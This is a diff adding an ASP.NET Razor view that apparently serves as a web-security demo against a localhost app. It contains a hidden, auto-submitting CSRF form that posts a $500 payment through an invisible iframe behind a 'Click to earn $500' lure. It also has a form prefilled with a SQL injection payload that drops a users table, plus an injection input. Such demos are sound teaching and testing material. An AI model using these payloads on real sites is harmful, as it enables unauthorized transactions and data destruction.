@@ -1,0 +1,44 @@
+﻿@{
+    Layout = null;
+}
+
+<!DOCTYPE html>
+
+<html>
+<head>
+    <meta name="viewport" content="width=device-width" />
+    <title>Index</title>
+</head>
+<body>
+    <div>
+        @using (Html.BeginForm("Inject", "Home", FormMethod.Get))
+        {
+            <textarea name="msg" style="width:400px; height:100px">
+            </textarea>
+            <br />
+            <input type="submit" />
+        }
+    </div>
+    <hr />
+    <div>
+        <iframe id="dummy" name="dummy" style="display:none"></iframe>
+        <form id="csrf" method="post" action="https://localhost:6001/home/pay" target="dummy">
+            <input type="hidden" name="amount" value="500" />
+            <button type="submit">Click to earn $500</button>
+            @Html.AntiForgeryToken()
+        </form>
+        <script>
+            document.getElementById('csrf').submit();
+        </script>
+        
+    </div>
+    <hr />
+    <div>
+        @using (Html.BeginForm("SqlInject", "Home", FormMethod.Get))
+        {
+            <textarea name="msg" style="width:400px; height:100px">a';DROP TABLE users;--</textarea>
+            <input type="submit" />
+        }
+    </div>
+</body>
+</html>
